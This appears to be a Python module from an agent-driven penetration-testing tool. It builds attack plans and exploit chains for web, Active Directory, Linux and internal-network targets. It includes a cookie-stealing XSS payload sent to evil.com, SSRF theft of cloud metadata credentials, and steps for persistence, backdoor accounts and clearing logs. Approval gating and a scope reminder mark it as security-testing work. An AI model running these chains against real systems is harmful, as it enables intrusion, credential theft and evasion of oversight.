"""
Attack Planning and Vulnerability Chaining System
Provides intelligent attack suggestions and automated exploit chaining
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from loguru import logger


@dataclass
class Vulnerability:
    """Represents a discovered vulnerability."""
    name: str
    severity: str  # critical, high, medium, low
    cve: Optional[str] = None
    service: Optional[str] = None
    port: Optional[int] = None
    description: str = ""
    exploitable: bool = False
    exploit_tools: List[str] = None
    
    def __post_init__(self):
        if self.exploit_tools is None:
            self.exploit_tools = []


@dataclass  
class AttackPath:
    """A suggested attack path."""
    name: str
    description: str
    steps: List[Dict[str, str]]
    prerequisites: List[str]
    success_probability: str  # high, medium, low
    tools_required: List[str]


# Vulnerability to exploit mappings
VULN_EXPLOIT_MAP = {
    # Web vulnerabilities
    "sql_injection": {
        "tools": ["sqlmap_attack"],
        "next_steps": ["dump_database", "extract_credentials", "upload_webshell"],
        "chain_to": ["credential_access", "code_execution"]
    },
    "xss": {
        "tools": ["xsstrike"],
        "next_steps": ["steal_cookies", "keylogging", "phishing"],
        "chain_to": ["session_hijack"]
    },
    "command_injection": {
        "tools": ["commix"],
        "next_steps": ["reverse_shell", "privilege_escalation"],
        "chain_to": ["code_execution", "privesc"]
    },
    "lfi": {
        "tools": ["curl_request"],
        "next_steps": ["read_passwd", "read_config", "log_poisoning"],
        "chain_to": ["credential_access", "code_execution"]
    },
    "rfi": {
        "tools": ["curl_request", "netcat_shell"],
        "next_steps": ["include_webshell", "reverse_shell"],
        "chain_to": ["code_execution"]
    },
    
    # Service vulnerabilities
    "smb_signing_disabled": {
        "tools": ["ntlmrelayx_start", "responder"],
        "next_steps": ["ntlm_relay", "capture_hashes"],
        "chain_to": ["credential_access", "lateral_movement"]
    },
    "ms17-010": {
        "tools": ["msfconsole_run"],
        "next_steps": ["eternalblue", "doublepulsar"],
        "chain_to": ["code_execution", "privesc"]
    },
    "zerologon": {
        "tools": ["zerologon_check"],
        "next_steps": ["reset_dc_password", "dcsync"],
        "chain_to": ["domain_admin"]
    },
    "petitpotam": {
        "tools": ["petitpotam_coerce", "ntlmrelayx_start"],
        "next_steps": ["coerce_dc", "relay_to_adcs"],
        "chain_to": ["domain_admin"]
    },
    
    # Authentication vulnerabilities
    "weak_password": {
        "tools": ["hydra_bruteforce", "kerbrute_spray"],
        "next_steps": ["password_spray", "brute_force"],
        "chain_to": ["initial_access"]
    },
    "kerberoasting": {
        "tools": ["rubeus_attack"],
        "next_steps": ["request_tgs", "crack_hashes"],
        "chain_to": ["credential_access"]
    },
    "asrep_roasting": {
        "tools": ["rubeus_attack"],
        "next_steps": ["get_asrep", "crack_hashes"],
        "chain_to": ["credential_access"]
    },
    
    # Misconfigurations
    "anonymous_ftp": {
        "tools": ["curl_request"],
        "next_steps": ["enumerate_files", "upload_files"],
        "chain_to": ["data_access", "code_execution"]
    },
    "default_credentials": {
        "tools": ["hydra_bruteforce", "curl_request"],
        "next_steps": ["login", "access_admin"],
        "chain_to": ["initial_access"]
    },
    "directory_listing": {
        "tools": ["gobuster_scan", "curl_request"],
        "next_steps": ["enumerate_files", "find_backups"],
        "chain_to": ["information_disclosure"]
    }
}


# Attack templates based on target profile
ATTACK_TEMPLATES = {
    "web_application": {
        "description": "Web Application Attack Path",
        "phases": [
            {"phase": "Recon", "tools": ["whatweb_scan", "nuclei_scan", "gobuster_scan"]},
            {"phase": "Vuln Scan", "tools": ["nuclei_scan", "wpscan", "sqlmap_attack"]},
            {"phase": "Exploit", "tools": ["sqlmap_attack", "xsstrike", "commix"]},
            {"phase": "Post-Exploit", "tools": ["curl_request", "netcat_shell"]}
        ]
    },
    "windows_domain": {
        "description": "Active Directory Attack Path",
        "phases": [
            {"phase": "Recon", "tools": ["nmap_scan", "enum4linux_scan", "ldapsearch_query"]},
            {"phase": "User Enum", "tools": ["kerbrute_userenum", "bloodhound_collector"]},
            {"phase": "Credential Attack", "tools": ["kerbrute_spray", "rubeus_attack"]},
            {"phase": "Lateral Movement", "tools": ["crackmapexec", "evil_winrm", "psexec_exec"]},
            {"phase": "Domain Admin", "tools": ["zerologon_check", "impacket_secretsdump"]}
        ]
    },
    "linux_server": {
        "description": "Linux Server Attack Path",
        "phases": [
            {"phase": "Recon", "tools": ["nmap_scan", "whatweb_scan"]},
            {"phase": "Service Exploit", "tools": ["searchsploit", "msfconsole_run"]},
            {"phase": "Initial Access", "tools": ["hydra_bruteforce", "netcat_shell"]},
            {"phase": "PrivEsc", "tools": ["linpeas_scan", "sudo_check"]},
            {"phase": "Post-Exploit", "tools": ["dump_shadow", "find_writable_dirs"]}
        ]
    },
    "network_internal": {
        "description": "Internal Network Attack Path",
        "phases": [
            {"phase": "Discovery", "tools": ["nmap_scan", "arpspoof_attack"]},
            {"phase": "MITM", "tools": ["mitm6_attack", "responder"]},
            {"phase": "Credential Capture", "tools": ["responder_capture", "ntlmrelayx_start"]},
            {"phase": "Lateral Movement", "tools": ["crackmapexec", "smbclient_access"]},
            {"phase": "Persistence", "tools": ["evil_winrm", "netcat_shell"]}
        ]
    }
}


class AttackPlanner:
    """
    Intelligent attack planning and vulnerability chaining.
    Suggests attack strategies based on discovered information.
    """
    
    def __init__(self):
        self.discovered_vulns: List[Vulnerability] = []
        self.discovered_services: Dict[int, str] = {}
        # 'unknown' is a placeholder; treat it as unset for auto-detection.
        self.target_profile: str = "unknown"
        self.attack_history: List[Dict] = []
    
    def add_vulnerability(self, vuln: Vulnerability):
        """Add a discovered vulnerability."""
        self.discovered_vulns.append(vuln)
        logger.debug(f"Added vulnerability: {vuln.name}")
    
    def add_service(self, port: int, service: str, version: str = ""):
        """Add a discovered service."""
        self.discovered_services[port] = f"{service} {version}".strip()
    
    def detect_target_profile(self) -> str:
        """Detect the target profile based on discovered services."""
        # If we have no service intel yet, default to web_app rather than
        # internal network. Internal-vs-external is environment-specific and
        # should be inferred from evidence (ports/services) when available.
        if not self.discovered_services:
            self.target_profile = "web_application"
            return self.target_profile

        services = " ".join(self.discovered_services.values()).lower()
        ports = set(self.discovered_services.keys())

        # Windows domain takes priority (very specific indicators)
        if any(s in services for s in ["ldap", "kerberos", "msrpc"]) or 445 in ports:
            self.target_profile = "windows_domain"
        # Web application: HTTP/HTTPS ports present (even alongside SSH)
        elif any(s in services for s in ["http", "https", "apache", "nginx", "iis", "tomcat"])\
                or any(p in ports for p in [80, 443, 8080, 8443, 8000, 8888]):
            self.target_profile = "web_application"
        # Pure SSH / Linux without web — only if no HTTP detected
        elif any(s in services for s in ["ssh", "linux"]) or 22 in ports:
            self.target_profile = "linux_server"
        else:
            self.target_profile = "network_internal"

        return self.target_profile
    
    def get_attack_plan(self, target_type: str = None) -> Dict:
        """
        Generate an attack plan based on target profile.
        
        Returns a structured attack plan with phases and tools.
        """
        _stored = self.target_profile
        if _stored == "unknown":
            _stored = None
        profile = target_type or _stored or self.detect_target_profile()
        
        if profile not in ATTACK_TEMPLATES:
            profile = "web_application"  # Default
        
        template = ATTACK_TEMPLATES[profile]
        
        plan = {
            "target_profile": profile,
            "description": template["description"],
            "phases": template["phases"],
            "discovered_vulns": len(self.discovered_vulns),
            "priority_vulns": [v.name for v in self.discovered_vulns 
                              if v.severity in ["critical", "high"]][:5]
        }
        
        return plan
    
    def suggest_next_actions(self) -> List[Dict]:
        """
        Suggest next actions based on current state.

        ENFORCES VALIDATION-FIRST WORKFLOW:
        - If unvalidated candidate vulns exist, suggests validation first
        - Only suggests exploitation AFTER vulnerabilities are validated
        - Prioritizes recon/vuln scanning over blind exploitation

        Returns prioritized list of suggested actions.
        """
        suggestions = []

        # ═══ VALIDATION-FIRST ENFORCEMENT ═══
        # Check if there are unvalidated candidate vulnerabilities
        try:
            from src.tools.planning import _candidate_vulns
            if _candidate_vulns:
                for cand in _candidate_vulns[-3:]:  # Suggest validating last 3 candidates
                    suggestions.append({
                        "action": f"VALIDATE FIRST: {cand['name']} ({cand['severity']}) — run auto_validate/multi_validate before exploiting",
                        "severity": cand["severity"],
                        "tools": ["auto_validate", "multi_validate", "score_finding"],
                        "next_steps": ["validate_finding", "register_vulnerability_with_evidence"],
                        "chain_to": [],
                        "priority": 0,  # HIGHEST priority — validation BEFORE exploitation
                        "validation_required": True,
                        "candidate_name": cand["name"],
                    })
        except Exception:
            pass

        # Based on discovered vulnerabilities (ONLY suggest exploitation if validated)
        for vuln in self.discovered_vulns:
            vuln_key = vuln.name.lower().replace(" ", "_").replace("-", "_")

            if vuln_key in VULN_EXPLOIT_MAP:
                mapping = VULN_EXPLOIT_MAP[vuln_key]
                # Check if this vuln was validated via PoC validation module
                poc_validated = False
                try:
                    from src.tools.poc_validation import get_validated_vulns
                    for v in get_validated_vulns():
                        if v.validated and vuln_key in v.vulnerability.lower():
                            poc_validated = True
                            break
                except Exception:
                    pass

                # Only suggest exploitation if it was validated
                if poc_validated or vuln.exploitable:
                    suggestions.append({
                        "action": f"Exploit {vuln.name}",
                        "severity": vuln.severity,
                        "tools": mapping["tools"],
                        "next_steps": mapping["next_steps"],
                        "chain_to": mapping["chain_to"],
                        "priority": self._get_priority(vuln.severity)
                    })
                else:
                    # Suggest validation instead of blind exploitation
                    suggestions.append({
                        "action": f"VALIDATE BEFORE EXPLOIT: {vuln.name} — not yet confirmed exploitable",
                        "severity": vuln.severity,
                        "tools": ["auto_validate", "multi_validate", "score_finding"],
                        "next_steps": ["validate_finding", "register_with_evidence"],
                        "chain_to": [],
                        "priority": 0,  # Validation first
                        "validation_required": True,
                    })

        # Based on services without known vulns
        for port, service in self.discovered_services.items():
            service_lower = service.lower()

            if "ssh" in service_lower and not any(v.port == port for v in self.discovered_vulns):
                suggestions.append({
                    "action": f"Brute force SSH (port {port}) — low priority; try web vulns first",
                    "severity": "low",
                    "tools": ["hydra_bruteforce"],
                    "next_steps": ["gain_access"],
                    "priority": 8  # ranked below web exploit suggestions (priority 1-3)
                })

            if "smb" in service_lower or port == 445:
                suggestions.append({
                    "action": f"Enumerate SMB (port {port})",
                    "severity": "medium",
                    "tools": ["enum4linux_scan", "smbclient_access"],
                    "next_steps": ["find_shares", "null_session"],
                    "priority": 4
                })

            if "ldap" in service_lower or port == 389:
                suggestions.append({
                    "action": "Enumerate LDAP",
                    "severity": "medium",
                    "tools": ["ldapsearch_query"],
                    "next_steps": ["find_users", "find_computers"],
                    "priority": 4
                })

        # Sort by priority (validation-first = priority 0 comes first)
        suggestions.sort(key=lambda x: x.get("priority", 10))

        return suggestions[:10]  # Top 10 suggestions
    
    def get_exploit_chain(self, start_vuln: str) -> List[Dict]:
        """
        Generate an exploit chain starting from a vulnerability.
        
        Args:
            start_vuln: The starting vulnerability name
        
        Returns:
            List of chained exploitation steps
        """
        chain = []
        current = start_vuln.lower().replace(" ", "_").replace("-", "_")
        visited = set()
        
        while current and current not in visited and len(chain) < 10:
            visited.add(current)
            
            if current in VULN_EXPLOIT_MAP:
                mapping = VULN_EXPLOIT_MAP[current]
                chain.append({
                    "step": len(chain) + 1,
                    "vulnerability": current,
                    "tools": mapping["tools"],
                    "actions": mapping["next_steps"],
                    "leads_to": mapping["chain_to"]
                })
                
                # Pick next step in chain
                if mapping["chain_to"]:
                    # Map chain targets to vulnerabilities
                    chain_map = {
                        "credential_access": "weak_password",
                        "code_execution": "command_injection",
                        "privesc": "weak_password",
                        "lateral_movement": "smb_signing_disabled",
                        "domain_admin": "zerologon"
                    }
                    current = chain_map.get(mapping["chain_to"][0], None)
                else:
                    current = None
            else:
                break
        
        return chain
    
    def _get_priority(self, severity: str) -> int:
        """Convert severity to priority number."""
        return {
            "critical": 1,
            "high": 2,
            "medium": 3,
            "low": 4,
            "info": 5
        }.get(severity.lower(), 5)
    
    def get_summary(self) -> str:
        """Get a summary of attack planning state."""
        lines = [
            f"🎯 Target Profile: {self.target_profile}",
            f"🔓 Vulnerabilities Found: {len(self.discovered_vulns)}",
            f"🔌 Services Discovered: {len(self.discovered_services)}",
        ]
        
        if self.discovered_vulns:
            critical = sum(1 for v in self.discovered_vulns if v.severity == "critical")
            high = sum(1 for v in self.discovered_vulns if v.severity == "high")
            if critical or high:
                lines.append(f"⚠️ Critical: {critical}, High: {high}")
        
        return "\n".join(lines)
    
    def generate_detailed_plan(self) -> Optional[Dict]:
        """
        Generate a comprehensive attack plan for user approval.
        Returns detailed plan with phases, risks, and expected outcomes.
        """
        if not self.discovered_services and not self.discovered_vulns:
            return None
        
        profile = self.detect_target_profile()
        template = ATTACK_TEMPLATES.get(profile, ATTACK_TEMPLATES["web_application"])
        
        # Determine priority level
        critical_vulns = [v for v in self.discovered_vulns if v.severity == "critical"]
        high_vulns = [v for v in self.discovered_vulns if v.severity == "high"]
        
        if critical_vulns:
            priority = "critical"
        elif high_vulns:
            priority = "high"
        elif self.discovered_vulns:
            priority = "medium"
        else:
            priority = "low"
        
        # Build detailed phases
        phases = []
        for i, phase_template in enumerate(template['phases']):
            phase_detail = {
                'name': phase_template['phase'],
                'objective': self._get_phase_objective(phase_template['phase'], profile),
                'tools': phase_template['tools'],
                'outcome': self._get_expected_outcome(phase_template['phase']),
                'risk': self._get_phase_risk(phase_template['phase']),
                'steps': self._get_phase_steps(phase_template['phase'], phase_template['tools']),
                'status': 'pending'
            }
            phases.append(phase_detail)
        
        # Identify high-value targets
        high_value_targets = []
        for vuln in critical_vulns + high_vulns:
            vuln_key = vuln.name.lower().replace(" ", "_").replace("-", "_")
            if vuln_key in VULN_EXPLOIT_MAP:
                mapping = VULN_EXPLOIT_MAP[vuln_key]
                high_value_targets.append({
                    'name': vuln.name,
                    'severity': vuln.severity,
                    'vector': f"{mapping['tools'][0]} → {mapping['next_steps'][0]}",
                    'probability': 'HIGH' if vuln.severity == 'critical' else 'MEDIUM',
                    'port': vuln.port or 'N/A',
                    'service': vuln.service or 'N/A'
                })
        
        # Generate summary
        summary = self._generate_plan_summary(profile, len(self.discovered_vulns), 
                                               len(critical_vulns), len(high_vulns))
        
        # Identify risks
        risks = self._identify_risks(profile, phases)
        
        plan = {
            'target_profile': profile,
            'vulns_found': len(self.discovered_vulns),
            'priority_level': priority,
            'summary': summary,
            'phases': phases,
            'high_value_targets': high_value_targets[:5],  # Top 5
            'risks': risks,
            'status': 'pending',
            'created_at': None  # Will be set when saved
        }
        
        return plan
    
    def _get_phase_objective(self, phase_name: str, profile: str) -> str:
        """Get objective description for a phase."""
        objectives = {
            'Recon': 'Gather intelligence about target systems, services, and potential vulnerabilities',
            'Discovery': 'Enumerate network services, users, and accessible resources',
            'Vuln Scan': 'Identify and validate exploitable vulnerabilities in discovered services',
            'User Enum': 'Enumerate valid user accounts and identify privileged users',
            'Credential Attack': 'Obtain valid credentials through password attacks or hash cracking',
            'Service Exploit': 'Exploit vulnerable services to gain initial access',
            'Initial Access': 'Establish initial foothold on target system',
            'Exploit': 'Exploit identified vulnerabilities to compromise target',
            'MITM': 'Position for man-in-the-middle attacks to intercept credentials',
            'Credential Capture': 'Capture authentication credentials from network traffic',
            'Lateral Movement': 'Move from compromised system to additional target systems',
            'PrivEsc': 'Escalate privileges to root/SYSTEM level access',
            'Domain Admin': 'Achieve domain administrator level access',
            'Post-Exploit': 'Maintain access, extract data, and establish persistence',
            'Persistence': 'Establish persistent access mechanisms for future access'
        }
        return objectives.get(phase_name, f'Execute {phase_name} phase tactics')
    
    def _get_expected_outcome(self, phase_name: str) -> str:
        """Get expected outcome for a phase."""
        outcomes = {
            'Recon': 'Complete target profile with services, technologies, and attack surface',
            'Discovery': 'Comprehensive service enumeration and user/share discovery',
            'Vuln Scan': 'List of confirmed exploitable vulnerabilities with CVE references',
            'User Enum': 'Valid username list and privilege mapping',
            'Credential Attack': 'Valid credentials (username:password) for access',
            'Service Exploit': 'Shell access or service compromise',
            'Initial Access': 'Active session on target system with user-level access',
            'Exploit': 'System compromise or remote code execution capability',
            'MITM': 'Positioned to intercept authentication traffic',
            'Credential Capture': 'NTLM hashes or plaintext credentials',
            'Lateral Movement': 'Access to additional systems in environment',
            'PrivEsc': 'Root/SYSTEM shell on compromised system',
            'Domain Admin': 'Domain Admin credentials or DA-level token',
            'Post-Exploit': 'Data exfiltration, backdoors installed, or evidence collected',
            'Persistence': 'Backdoor accounts, scheduled tasks, or persistent shells'
        }
        return outcomes.get(phase_name, f'{phase_name} objectives completed')
    
    def _get_phase_risk(self, phase_name: str) -> str:
        """Get risk level for a phase."""
        high_risk = ['Exploit', 'Service Exploit', 'Domain Admin', 'Post-Exploit']
        medium_risk = ['Credential Attack', 'MITM', 'Lateral Movement', 'PrivEsc']
        
        if phase_name in high_risk:
            return 'HIGH'
        elif phase_name in medium_risk:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _get_phase_steps(self, phase_name: str, tools: List[str]) -> List[str]:
        """Generate step-by-step actions for a phase."""
        steps_map = {
            'Recon': [
                f'Run {tools[0]} against target',
                'Enumerate subdomains and DNS records',
                'Identify running services and versions',
                'Document findings in target profile'
            ],
            'Vuln Scan': [
                'Execute vulnerability scanner',
                'Validate high-severity findings',
                'Cross-reference with public exploits',
                'Prioritize exploitable vulnerabilities'
            ],
            'Exploit': [
                'Select highest probability exploit',
                'Configure payload and parameters',
                'Execute exploit attempt',
                'Confirm successful compromise'
            ],
            'Initial Access': [
                'Test captured credentials',
                'Establish remote session',
                'Verify access level',
                'Enumerate local environment'
            ],
            'Post-Exploit': [
                'Escalate privileges if needed',
                'Collect sensitive data',
                'Install persistence mechanism',
                'Clear or minimize logs'
            ]
        }
        
        return steps_map.get(phase_name, [
            f'Execute {phase_name} tactics',
            f'Use tools: {", ".join(tools[:2])}',
            'Document results',
            'Proceed to next phase'
        ])
    
    def _generate_plan_summary(self, profile: str, total_vulns: int, 
                                critical: int, high: int) -> str:
        """Generate executive summary for the plan."""
        profile_desc = {
            'web_application': 'web application assessment',
            'windows_domain': 'Active Directory environment attack',
            'linux_server': 'Linux server penetration test',
            'network_internal': 'internal network compromise'
        }
        
        summary = f"This attack plan targets a {profile_desc.get(profile, 'security assessment')}. "
        
        if total_vulns == 0:
            summary += "No critical vulnerabilities identified yet. Plan focuses on thorough reconnaissance and service exploitation."
        else:
            summary += f"Analysis identified {total_vulns} potential vulnerabilities"
            if critical > 0:
                summary += f" including {critical} CRITICAL severity issues"
            if high > 0:
                summary += f" and {high} HIGH severity issues"
            summary += ". "
            
            summary += "Plan prioritizes exploiting confirmed vulnerabilities for maximum impact. "
        
        summary += "Each phase builds upon previous discoveries to systematically compromise the target. "
        summary += "User approval required before proceeding with exploitation phases."
        
        return summary
    
    def _identify_risks(self, profile: str, phases: List[Dict]) -> List[str]:
        """Identify operational risks for the plan."""
        risks = []
        
        # Check for high-risk phases
        phase_names = [p['name'] for p in phases]
        
        if 'Exploit' in phase_names or 'Service Exploit' in phase_names:
            risks.append("Active exploitation may trigger IDS/IPS alerts")
            risks.append("Exploits may cause service disruption or instability")
        
        if 'Domain Admin' in phase_names:
            risks.append("Domain admin attacks are highly visible in enterprise environments")
        
        if 'MITM' in phase_names:
            risks.append("MITM attacks may disrupt network communications")
        
        if 'Credential Attack' in phase_names:
            risks.append("Password attacks may trigger account lockout policies")
        
        # Profile-specific risks
        if profile == 'windows_domain':
            risks.append("Active Directory attacks often logged by security monitoring")
        elif profile == 'web_application':
            risks.append("Web attacks may be logged by WAF or application firewall")
        
        # General risks
        risks.append("All testing should be conducted within authorized scope only")
        risks.append("Maintain detailed logs for client reporting and compliance")
        
        return risks
    
    def save_pending_plan(self, plan: Dict):
        """Save the plan as pending user approval."""
        from datetime import datetime
        plan['created_at'] = datetime.now().isoformat()
        plan['status'] = 'pending_approval'
        self.pending_plan = plan
        logger.info(f"Attack plan saved - Status: {plan['status']}")
    
    def get_current_plan(self) -> Optional[Dict]:
        """Get the current attack plan (pending or active)."""
        return getattr(self, 'pending_plan', None) or getattr(self, 'active_plan', None)
    
    def approve_plan(self) -> bool:
        """Approve the pending plan for execution."""
        if hasattr(self, 'pending_plan'):
            self.pending_plan['status'] = 'approved'
            self.active_plan = self.pending_plan
            delattr(self, 'pending_plan')
            logger.info("Attack plan approved by user")
            return True
        return False
    
    def modify_plan(self, phase: str, changes: str) -> bool:
        """Modify a plan phase based on user feedback."""
        plan = self.get_current_plan()
        if not plan:
            return False
        
        # If phase is 'dynamic' or empty, just append to the active phase or add a new one
        if not phase or phase.lower() == "dynamic":
            self.dynamic_update(changes)
            return True
            
        # Find matching phase
        for p in plan['phases']:
            if phase.lower() in p['name'].lower() or phase in str(plan['phases'].index(p) + 1):
                # Record modification
                if 'modifications' not in p:
                    p['modifications'] = []
                p['modifications'].append(changes)
                logger.info(f"Plan modified - Phase: {p['name']}, Changes: {changes}")
                return True
        
        return False

    def dynamic_update(self, recommendation: str, findings: List[Any] = None):
        """Dynamically adapt the plan based on new findings or supervisor feedback."""
        plan = self.get_current_plan()
        if not plan:
            return
            
        # Create a new dynamic phase for the recommendation
        new_phase = {
            "name": "Dynamic Adaptation",
            "objective": "Execute adapted actions to overcome roadblocks or leverage new findings",
            "tools": ["(dynamic)"],
            "outcome": "Successful adaptation",
            "risk": "medium",
            "status": "pending",
            "steps": [recommendation]
        }
        
        # Inject the new phase at the front of the pending phases
        insert_idx = len(plan['phases'])
        for i, p in enumerate(plan['phases']):
            if p.get('status', 'pending') == 'pending':
                insert_idx = i
                break
                
        plan['phases'].insert(insert_idx, new_phase)
        logger.info(f"Dynamically injected new phase into plan: {recommendation[:100]}")
    
    def get_next_phase(self) -> Optional[Dict]:
        """Get the next phase to execute in the approved plan."""
        if not hasattr(self, 'active_plan') or not self.active_plan:
            return None
        
        for phase in self.active_plan['phases']:
            if phase['status'] == 'pending':
                return phase
        
        return None
    
    def mark_phase_complete(self, phase_name: str):
        """Mark a phase as completed."""
        if hasattr(self, 'active_plan') and self.active_plan:
            for phase in self.active_plan['phases']:
                if phase['name'] == phase_name:
                    phase['status'] = 'completed'
                    logger.info(f"Phase completed: {phase_name}")
                    break
    
    def mark_phase_in_progress(self, phase_name: str):
        """Mark a phase as in progress."""
        if hasattr(self, 'active_plan') and self.active_plan:
            for phase in self.active_plan['phases']:
                if phase['name'] == phase_name:
                    phase['status'] = 'in-progress'
                    logger.info(f"Phase started: {phase_name}")
                    break


# Global instance
_planner: Optional[AttackPlanner] = None


def get_attack_planner() -> AttackPlanner:
    """Get or create the global attack planner instance."""
    global _planner
    if _planner is None:
        _planner = AttackPlanner()
    return _planner


def reset_attack_planner():
    """Reset the attack planner for a new target."""
    global _planner
    _planner = AttackPlanner()


# Helper functions for agent use
def suggest_attack_plan(target_type: str | None = None) -> str:
    """
    Get a formatted attack plan suggestion.
    For use by agents.
    """
    planner = get_attack_planner()
    plan = planner.get_attack_plan(target_type)
    
    lines = [
        f"## 🎯 Attack Plan: {plan['description']}",
        "",
        "### Phases:"
    ]
    
    for phase in plan["phases"]:
        tools = ", ".join(phase["tools"])
        lines.append(f"**{phase['phase']}**: {tools}")
    
    if plan["priority_vulns"]:
        lines.append("")
        lines.append("### Priority Targets:")
        for vuln in plan["priority_vulns"]:
            lines.append(f"- {vuln}")
    
    return "\n".join(lines)


def suggest_next_action() -> str:
    """
    Get suggested next actions.
    For use by agents.
    """
    planner = get_attack_planner()
    suggestions = planner.suggest_next_actions()
    
    if not suggestions:
        return "No specific suggestions. Run reconnaissance first."
    
    lines = ["## 💡 Suggested Actions:"]
    
    for i, sugg in enumerate(suggestions[:5], 1):
        tools = ", ".join(sugg["tools"])
        lines.append(f"{i}. **{sugg['action']}** [{sugg['severity']}]")
        lines.append(f"   Tools: {tools}")
    
    return "\n".join(lines)


def get_exploit_chain_for(vulnerability: str) -> str:
    """
    Get an exploit chain starting from a vulnerability.
    For use by agents.
    """
    planner = get_attack_planner()
    chain = planner.get_exploit_chain(vulnerability)
    
    if not chain:
        return f"No known exploit chain for: {vulnerability}"
    
    lines = [f"## 🔗 Exploit Chain: {vulnerability}", ""]
    
    for step in chain:
        tools = ", ".join(step["tools"])
        lines.append(f"**Step {step['step']}**: {step['vulnerability']}")
        lines.append(f"   Tools: {tools}")
        lines.append(f"   Actions: {', '.join(step['actions'])}")
        lines.append("")
    
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
# Phase 4 — Exploit Chain Engine
# Deterministic, KB-aware, MITRE ATT&CK-tagged chaining (no LLM required)
# ═══════════════════════════════════════════════════════════════════════════

from dataclasses import dataclass


@dataclass
class ChainStep:
    """One step inside an exploit chain."""
    order: int
    action: str                 # Human-readable action description
    vuln_ids: List[str]         # Which confirmed vulns this step exploits
    tool: str                   # Primary tool or technique
    mitre_tactic: str           # e.g. "TA0006_Credential_Access"
    mitre_technique: str        # e.g. "T1552"
    notes: str = ""


@dataclass
class ExploitChain:
    """A complete multi-step attack chain."""
    id: str
    title: str
    severity: str               # CRITICAL / HIGH / MEDIUM
    cvss_estimate: float
    impact: str
    confidence: float           # 0.0–1.0
    steps: List[ChainStep]
    prerequisites: List[str]    # vuln IDs required
    enhancers: List[str]        # vuln IDs that boost confidence if present
    tags: List[str]
    recommendations: List[str]


# ---------------------------------------------------------------------------
# Chain rule table
# Each entry defines one known attack chain.
#
# triggers  — chain fires if ANY of these is in the confirmed vuln list
# requires  — ALL of these must also be present (can be empty)
# enhancers — optional vulns that boost confidence
# ---------------------------------------------------------------------------

_CHAIN_RULES: List[Dict] = [

    # ── Web Application Chains ─────────────────────────────────────────────

    {
        "id": "ssrf_cloud_creds",
        "title": "SSRF → Cloud Metadata → IAM Credential Theft",
        "triggers": ["ssrf", "cloud_metadata"],
        "requires":  [],
        "enhancers": ["cloud_metadata", "ssrf"],
        "severity":  "CRITICAL",
        "cvss":      9.1,
        "confidence": 0.90,
        "impact":    "Cloud IAM credentials (AWS/GCP/Azure) exposed via metadata endpoint; full cloud account compromise possible.",
        "steps": [
            ChainStep(1, "Confirm SSRF via OOB callback (Burp Collaborator / interactsh)",                  ["ssrf"],           "ssrf_scanner",       "TA0001_Initial_Access",        "T1190",  "Verify DNS/HTTP out-of-band interaction"),
            ChainStep(2, "Pivot SSRF to http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["ssrf", "cloud_metadata"], "curl_request",  "TA0006_Credential_Access",     "T1552.005", "Retrieve IAM role name then creds"),
            ChainStep(3, "Extract AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / Token",                       ["cloud_metadata"], "curl_request",       "TA0006_Credential_Access",     "T1552",  "Parse JSON credential blob"),
            ChainStep(4, "Use stolen credentials with aws-cli / pacu for enumeration",                      [],                 "run_exploit_script", "TA0007_Discovery",             "T1580",  "aws sts get-caller-identity"),
            ChainStep(5, "Escalate to S3 exfiltration / RDS snapshot / Lambda code access",                [],                 "run_exploit_script", "TA0010_Exfiltration",          "T1537",  "Data exfiltration via cloud storage"),
        ],
        "tags":            ["cloud", "ssrf", "aws", "gcp", "azure"],
        "recommendations": ["Enforce IMDSv2 (require session tokens)", "Block SSRF via egress firewall / allow-list", "Rotate IAM credentials immediately"],
    },

    {
        "id": "open_redirect_oauth_ato",
        "title": "Open Redirect → OAuth Code Hijack → Account Takeover",
        "triggers": ["open_redirect"],
        "requires":  [],
        "enhancers": ["cors_misconfiguration"],
        "severity":  "HIGH",
        "cvss":      8.1,
        "confidence": 0.75,
        "impact":    "Attacker steals OAuth authorization code via redirect_uri manipulation, achieving full account takeover.",
        "steps": [
            ChainStep(1, "Confirm open redirect: inject https://evil.com as redirect target",       ["open_redirect"],  "full_appsec_scan",    "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Craft OAuth authorization URL with redirect_uri pointing to redirect chain ending at attacker", ["open_redirect"], "curl_request", "TA0043_Reconnaissance", "T1598",  ""),
            ChainStep(3, "Send phishing link to victim; victim clicks and OAuth code is leaked in Referer header", [], "browser_visit", "TA0001_Initial_Access", "T1566.002", ""),
            ChainStep(4, "Exchange stolen code for access_token at /oauth/token",                   [],                 "curl_request",        "TA0006_Credential_Access", "T1528",  ""),
            ChainStep(5, "Use token to authenticate as victim",                                     [],                 "http_request",        "TA0004_Privilege_Escalation","T1134", ""),
        ],
        "tags":            ["oauth", "account-takeover", "open-redirect"],
        "recommendations": ["Validate redirect_uri strictly against allow-list", "Use state parameter to prevent CSRF on OAuth flow"],
    },

    {
        "id": "stored_xss_session_hijack",
        "title": "Stored XSS → Cookie Theft → Session Hijack",
        "triggers": ["xss_stored"],
        "requires":  [],
        "enhancers": ["cors_misconfiguration", "csrf_token_bypass"],
        "severity":  "HIGH",
        "cvss":      8.0,
        "confidence": 0.85,
        "impact":    "Attacker persists JavaScript in the application; every victim who views the page has their session cookie stolen.",
        "steps": [
            ChainStep(1, "Confirm stored XSS: inject <script>alert(1)</script> into persistent field (comment/profile)", ["xss_stored"], "dalfox_scan", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Replace with cookie-stealing payload: fetch('https://evil.com/?'+document.cookie)", ["xss_stored"], "browser_execute_js", "TA0006_Credential_Access", "T1539", ""),
            ChainStep(3, "Wait for admin/privileged user to visit the page; collect session cookie",     [], "http_request",  "TA0006_Credential_Access", "T1539", "Monitor callback server"),
            ChainStep(4, "Inject cookie into browser / curl and access application as victim",           [], "browser_auth_test", "TA0004_Privilege_Escalation", "T1134", ""),
            ChainStep(5, "If admin session: extract data, create backdoor account, escalate",            [], "http_request",  "TA0007_Discovery",         "T1087",  ""),
        ],
        "tags":            ["xss", "session", "cookie", "stored-xss"],
        "recommendations": ["Set HttpOnly flag on all session cookies", "Implement strict CSP with nonce", "Sanitize all stored user input"],
    },

    {
        "id": "xss_csrf_admin_action",
        "title": "XSS + CSRF → Unauthorized Admin Action",
        "triggers": ["xss_reflected", "xss_stored"],
        "requires":  ["csrf"],
        "enhancers": ["csrf_token_bypass"],
        "severity":  "HIGH",
        "cvss":      7.5,
